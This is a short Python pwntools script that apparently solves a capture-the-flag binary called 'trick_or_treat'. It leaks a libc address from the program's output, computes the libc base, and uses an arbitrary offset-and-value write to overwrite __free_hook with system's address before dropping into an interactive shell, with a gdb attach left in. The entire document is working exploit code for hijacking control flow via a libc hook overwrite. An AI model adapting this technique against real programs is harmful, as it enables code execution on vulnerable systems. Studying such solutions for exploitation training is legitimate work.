from pwn import *

if __name__ == "__main__":
	libc = ELF("./libc.so.6")
	p = process("./trick_or_treat")
	p.sendlineafter("Size:",str(0x800000))
	p.recvuntil("Magic:")
	addr = int(p.recvline(),16)
	LIBC = addr + 0x7f1f3fc91000 - 0x7f1f3f490010
	log.info("LIBC: 0x%x"%LIBC)

	malloc_hook = LIBC + libc.symbols['__malloc_hook']
	free_hook = LIBC + libc.symbols['__free_hook']
	printf = LIBC + libc.symbols['printf']
	system = LIBC + libc.symbols['system']
	stack_chk_fail = LIBC + libc.symbols['__stack_chk_fail']
	libc_version = LIBC + 0x21cb0
	index = (free_hook-addr)/8
	p.sendlineafter("Offset & Value:", "%x"%index)
	p.sendline("%x"%(system))
	gdb.attach(p,gdbscript="b *__libc_malloc")
	p.sendlineafter("Offset & Value:","1 1")
	p.interactive()
